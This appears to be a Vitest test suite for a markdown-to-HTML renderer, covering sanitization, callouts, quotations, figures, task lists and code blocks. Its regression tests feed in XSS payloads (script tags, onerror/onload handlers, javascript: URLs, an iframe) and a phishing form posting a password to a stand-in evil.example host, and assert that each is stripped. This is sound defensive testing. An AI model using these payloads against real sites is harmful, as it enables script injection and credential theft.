import { describe, expect, it } from 'vitest'
import { renderMarkdown } from './markdown'

describe('renderMarkdown', () => {
  it('renders basic markdown to HTML', () => {
    const html = renderMarkdown('# Title\n\nSome **bold** text.')

    expect(html).toContain('<h1')
    expect(html).toContain('Title')
    expect(html).toContain('<strong>bold</strong>')
  })

  it('renders links and lists', () => {
    const html = renderMarkdown('- one\n- two\n\n[link](https://example.com)')

    expect(html).toContain('<li>one</li>')
    expect(html).toContain('<li>two</li>')
    expect(html).toContain('<a href="https://example.com" rel="noopener noreferrer">link</a>')
  })

  // Regression test for issue #27: unsanitized markdown/HTML input must
  // never reach the DOM with executable script or event-handler attributes.
  it('strips <script> tags from raw HTML embedded in markdown', () => {
    const html = renderMarkdown('# Title\n\n<script>alert("xss")</script>')

    expect(html).not.toContain('<script')
    expect(html).not.toContain('alert(')
  })

  it('strips inline event-handler attributes (onerror, onload, etc.)', () => {
    const html = renderMarkdown('<img src="x" onerror="alert(1)">')

    expect(html).not.toContain('onerror')
    expect(html).not.toContain('alert(1)')
  })

  it('strips javascript: URLs from links and images', () => {
    const html = renderMarkdown('[click me](javascript:alert(1))')

    expect(html).not.toContain('javascript:')
  })

  it('strips <iframe> and other dangerous tags entirely', () => {
    const html = renderMarkdown('<iframe src="https://evil.example"></iframe>')

    expect(html).not.toContain('<iframe')
  })

  it('neutralizes SVG-based XSS payloads', () => {
    const html = renderMarkdown('<svg onload="alert(1)"><script>alert(2)</script></svg>')

    expect(html).not.toContain('onload')
    expect(html).not.toContain('<script')
  })

  it('preserves plain text content while dropping malicious markup', () => {
    const html = renderMarkdown('Hello <img src=x onerror=alert(1)> world')

    expect(html).toContain('Hello')
    expect(html).toContain('world')
    expect(html).not.toContain('onerror')
  })

  it('returns an empty string for empty input', () => {
    expect(renderMarkdown('')).toBe('')
  })

  // Regression test: DOMPurify's default config keeps <form>/<input>,
  // which without CSP form-action would let a hostile document render a
  // working phishing form inside the preview pane.
  it('strips <form> and form-control tags entirely', () => {
    const html = renderMarkdown(
      '<form action="https://evil.example/steal" method="post"><input name="pw"><button>Go</button></form>',
    )

    expect(html).not.toContain('<form')
    expect(html).not.toContain('<input')
    expect(html).not.toContain('<button')
    expect(html).not.toContain('evil.example')
  })

  it('adds rel="noopener noreferrer" to every link', () => {
    const html = renderMarkdown('[a](https://a.example) and [b](https://b.example)')

    expect(html).toContain('href="https://a.example" rel="noopener noreferrer"')
    expect(html).toContain('href="https://b.example" rel="noopener noreferrer"')
  })

  it('converts single newlines to <br> tags within a paragraph', () => {
    const html = renderMarkdown('Line one\nLine two\nLine three')

    expect(html).toContain('Line one<br>')
    expect(html).toContain('Line two<br>')
    expect(html).toContain('Line three')
    // Ensure no extra <p> tags — single newlines don't create new paragraphs
    expect(html).not.toContain('<p>Line one</p>')
  })

  it('still treats blank lines as paragraph breaks', () => {
    const html = renderMarkdown('Paragraph one\n\nParagraph two')

    expect(html).toContain('<p>Paragraph one</p>')
    expect(html).toContain('<p>Paragraph two</p>')
    expect(html).not.toContain('<br>')
  })
})

// Composite structures emitted for the document theme (document.css).
// Parsed back into a DOM so assertions target structure, not whitespace.
function render(markdown: string): HTMLElement {
  const container = document.createElement('div')
  container.innerHTML = renderMarkdown(markdown)
  return container
}

describe('renderMarkdown — callouts (GitHub alerts)', () => {
  it.each([
    ['NOTE', 'note', 'Nota'],
    ['TIP', 'tip', 'Dica'],
    ['IMPORTANT', 'important', 'Importante'],
    ['WARNING', 'warning', 'Aviso'],
    ['CAUTION', 'caution', 'Cuidado'],
  ])('renders > [!%s] as a %s callout labelled "%s"', (marker, type, label) => {
    const doc = render(`> [!${marker}]\n> Corpo do alerta.`)

    const callout = doc.querySelector('.md-callout')
    expect(callout?.getAttribute('data-callout')).toBe(type)
    expect(callout?.getAttribute('role')).toBe('note')
    expect(callout?.querySelector('.md-callout-title')?.textContent).toBe(label)
    expect(callout?.querySelector('p:not(.md-callout-title)')?.textContent).toBe('Corpo do alerta.')
    expect(doc.textContent).not.toContain('[!')
    expect(doc.querySelector('blockquote')).toBeNull()
  })

  it('accepts a lowercase marker', () => {
    expect(render('> [!tip]\n> x').querySelector('[data-callout="tip"]')).not.toBeNull()
  })

  it('keeps the type label next to a custom title on the marker line', () => {
    const title = render('> [!WARNING] **Leia** antes\n> Corpo').querySelector('.md-callout-title')

    expect(title?.querySelector('.md-callout-label')?.textContent).toBe('Aviso')
    expect(title?.querySelector('strong')?.textContent).toBe('Leia')
    expect(title?.textContent).toBe('Aviso Leia antes')
  })

  it('keeps every block after the marker paragraph', () => {
    const callout = render('> [!NOTE]\n> Primeiro\n>\n> - item\n>\n> Último').querySelector(
      '.md-callout',
    )

    expect(callout?.querySelector('ul li')?.textContent).toBe('item')
    expect(callout?.textContent).toContain('Primeiro')
    expect(callout?.textContent).toContain('Último')
  })

  it('renders a marker with no body as a title-only callout', () => {
    const callout = render('> [!IMPORTANT]').querySelector('.md-callout')

    expect(callout?.children).toHaveLength(1)
    expect(callout?.textContent?.trim()).toBe('Importante')
  })

  it('leaves unknown markers and plain quotes as blockquotes', () => {
    expect(render('> [!DANGER]\n> x').querySelector('.md-callout')).toBeNull()
    expect(render('> [!DANGER]\n> x').querySelector('blockquote')).not.toBeNull()
    expect(render('> só uma citação').querySelector('.md-callout')).toBeNull()
  })

  it('sanitizes callout content like any other markdown', () => {
    const html = renderMarkdown(
      '> [!NOTE] <img src=x onerror=alert(1)>\n> <script>alert(2)</script>',
    )

    expect(html).toContain('data-callout="note"')
    expect(html).not.toContain('onerror')
    expect(html).not.toContain('<script')
  })
})

describe('renderMarkdown — quotations with attribution', () => {
  it('moves a trailing "— Autor" paragraph into a figcaption', () => {
    const doc = render('> A palavra é uma marca.\n>\n> — Autora, *Livro*')

    const figure = doc.querySelector('figure.md-quote')
    expect(figure?.querySelector('blockquote')?.textContent?.trim()).toBe('A palavra é uma marca.')
    expect(figure?.querySelector('figcaption')?.textContent).toBe('— Autora, Livro')
    expect(figure?.querySelector('figcaption em')?.textContent).toBe('Livro')
  })

  it('splits an attribution typed on the quote’s last line', () => {
    const figure = render('> Primeira linha\n> segunda linha.\n> -- Fulano').querySelector(
      'figure.md-quote',
    )

    expect(figure?.querySelector('blockquote p')?.innerHTML).toBe(
      'Primeira linha<br>segunda linha.',
    )
    expect(figure?.querySelector('figcaption')?.textContent).toBe('— Fulano')
  })

  it.each([
    ['dialogue lines', '> — Onde você vai?\n> — Para casa'],
    ['dialogue after narration', '> Ela parou.\n> — Onde?\n> — Em casa'],
    ['dialogue paragraphs', '> — Onde você vai?\n>\n> — Para casa'],
    ['speech introduced by a colon', '> Ela disse:\n> — Vamos embora'],
    ['a dash line that ends like a sentence', '> Texto\n>\n> — Isto é uma frase.'],
    ['a lone dash line', '> — Autor'],
    ['a dash with nothing after it', '> Texto\n> —'],
  ])('leaves %s as a plain blockquote', (_, markdown) => {
    const doc = render(markdown)

    expect(doc.querySelector('figure')).toBeNull()
    expect(doc.querySelector('blockquote')).not.toBeNull()
  })

  it('ignores an over-long "attribution"', () => {
    const doc = render(`> Texto\n>\n> — ${'palavra '.repeat(30)}`)

    expect(doc.querySelector('figure')).toBeNull()
  })
})

describe('renderMarkdown — figures', () => {
  it('wraps a standalone image with a title in a captioned figure', () => {
    const figure = render('![Paisagem](https://example.com/a.png "Vista do morro")').querySelector(
      'figure.md-image',
    )

    const img = figure?.querySelector('img')
    expect(img?.getAttribute('src')).toBe('https://example.com/a.png')
    expect(img?.getAttribute('alt')).toBe('Paisagem')
    // The title becomes the caption instead of also staying a tooltip.
    expect(img?.hasAttribute('title')).toBe(false)
    expect(figure?.querySelector('figcaption')?.textContent).toBe('Vista do morro')
  })

  it('escapes the caption text', () => {
    const figure = render('![a](a.png "<b>x</b> & y")').querySelector('figure')

    expect(figure?.querySelector('figcaption')?.textContent).toBe('<b>x</b> & y')
    expect(figure?.querySelector('figcaption b')).toBeNull()
  })

  it('makes an untitled standalone image a figure without a caption', () => {
    const figure = render('![Paisagem](a.png)').querySelector('figure.md-image')

    expect(figure?.querySelector('img')).not.toBeNull()
    expect(figure?.querySelector('figcaption')).toBeNull()
  })

  it('leaves images that share their paragraph inline', () => {
    const doc = render('Texto ![ícone](a.png "t") e mais texto')

    expect(doc.querySelector('figure')).toBeNull()
    expect(doc.querySelector('p img')?.getAttribute('title')).toBe('t')
  })
})

describe('renderMarkdown — task lists', () => {
  it('keeps each item’s state (the sanitizer strips <input>)', () => {
    const doc = render('- [x] feita\n- [ ] pendente')

    const list = doc.querySelector('ul')
    expect(list?.classList.contains('md-task-list')).toBe(true)
    expect(list?.getAttribute('role')).toBe('list')
    const items = doc.querySelectorAll('li.md-task')
    expect([...items].map((li) => li.getAttribute('data-task'))).toEqual(['done', 'todo'])
    const checks = doc.querySelectorAll('.md-task-check')
    expect([...checks].map((c) => c.getAttribute('aria-checked'))).toEqual(['true', 'false'])
    expect(checks[0]?.getAttribute('role')).toBe('checkbox')
    expect(checks[0]?.getAttribute('aria-disabled')).toBe('true')
    expect(doc.querySelector('input')).toBeNull()
  })

  it('marks loose and ordered task lists too', () => {
    expect(
      render('- [x] a\n\n- [ ] b').querySelectorAll('li.md-task p .md-task-check'),
    ).toHaveLength(2)
    expect(render('1. [x] a\n2. [ ] b').querySelector('ol.md-task-list')).not.toBeNull()
  })

  it('leaves ordinary lists untouched', () => {
    const html = renderMarkdown('- a\n- b')

    expect(html).toContain('<ul>\n<li>a</li>')
    expect(html).not.toContain('md-task')
  })
})

describe('renderMarkdown — code blocks', () => {
  it('wraps fenced code with a language in a labelled container', () => {
    const block = render('```ts\nconst a = 1\n```').querySelector('.md-code')

    expect(block?.getAttribute('data-lang')).toBe('ts')
    expect(block?.querySelector('pre > code.language-ts')?.textContent).toBe('const a = 1\n')
  })

  it('uses only the first word of the info string', () => {
    expect(
      render('```c++ linenos\nx\n```').querySelector('.md-code')?.getAttribute('data-lang'),
    ).toBe('c++')
  })

  it('does not label code without a (sane) language', () => {
    expect(render('```\nx\n```').querySelector('.md-code')).toBeNull()
    expect(render('    indented').querySelector('.md-code')).toBeNull()
    expect(render('```"><x\nx\n```').querySelector('.md-code')).toBeNull()
    expect(render('```\nx\n```').querySelector('pre > code')).not.toBeNull()
  })
})
